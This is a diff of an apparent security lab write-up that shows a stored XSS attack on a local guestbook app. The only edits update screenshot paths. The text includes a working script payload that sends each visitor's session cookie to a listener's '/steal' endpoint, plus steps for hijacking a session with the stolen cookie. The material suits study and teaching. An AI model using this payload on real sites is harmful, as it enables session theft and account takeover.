@@ -34,7 +34,7 @@ Because of this, any HTML or JavaScript submitted in a comment is written direct
 
 A second script (`listener.py`) plays the role of the attacker's server: a minimal local HTTP listener on port 8000 that logs any cookie value sent to `/steal`.
 
-![Clean guestbook before any payload, showing the attacker's own session ID](stored-screenshots/01-baseline-guestbook.png)
+![Clean guestbook before any payload, showing the attacker's own session ID](01-baseline-guestbook.png)
 
 ---
 
@@ -46,13 +46,13 @@ The following payload was submitted through the comment field:
 <script>fetch('http://127.0.0.1:8000/steal?cookie=' + document.cookie)</script>
 ```
 
-![Payload entered into the guestbook's comment field](stored-screenshots/02-payload-entered.png)
+![Payload entered into the guestbook's comment field](02-payload-entered.png)
 
 Once submitted, the comment is saved server-side in the application's in-memory comment list — permanently, until the app restarts — meaning it will now execute for every single visitor who loads the guestbook page, not just the one who posted it.
 
 Immediately after posting, the listener logged the poster's own cookie, confirming the script executed on submission:
 
-![Listener terminal capturing the first cookie — the attacker's own session, fired immediately on submission](stored-screenshots/03-listener-first-capture.png)
+![Listener terminal capturing the first cookie — the attacker's own session, fired immediately on submission](03-listener-first-capture.png)
 
 ---
 
@@ -62,11 +62,11 @@ To simulate a real second user, a private/incognito browser window was opened �
 
 Visiting the guestbook in this window assigned a brand new session cookie, distinct from the attacker's:
 
-![Victim's incognito window showing a different session ID, having only viewed the page normally](stored-screenshots/04-victim-incognito-session.png)
+![Victim's incognito window showing a different session ID, having only viewed the page normally](04-victim-incognito-session.png)
 
 The victim did not click a link, submit a form, or take any malicious action — they simply loaded the guestbook to read comments, exactly as an ordinary user would. Because the payload is now stored on the server, it executed automatically in the victim's browser too, sending their session cookie to the listener without their knowledge:
 
-![Listener now showing a second captured cookie, belonging to the separate victim session](stored-screenshots/05-listener-second-capture.png)
+![Listener now showing a second captured cookie, belonging to the separate victim session](05-listener-second-capture.png)
 
 This is the defining property of stored XSS: the attacker did not need to target this specific victim, craft a link, or get them to click anything. Simply visiting the already-compromised page was enough.
 
@@ -81,7 +81,7 @@ With the victim's `session_id` value captured, it was used to impersonate them:
 3. The `session_id` cookie value was manually overwritten with the victim's stolen ID
 4. The page was reloaded
 
-![Session hijack confirmed — the browser's session banner and stored cookie now both show the victim's session ID, not the attacker's original one](stored-screenshots/06-session-hijack-confirmed.png)
+![Session hijack confirmed — the browser's session banner and stored cookie now both show the victim's session ID, not the attacker's original one](06-session-hijack-confirmed.png)
 
 The application now treats this browser as the victim, purely because it presents the victim's session identifier. In a real application, this is precisely the mechanism by which an attacker would gain access to a victim's authenticated session — viewing their data, performing actions as them, or accessing account settings — without ever knowing their password.
 
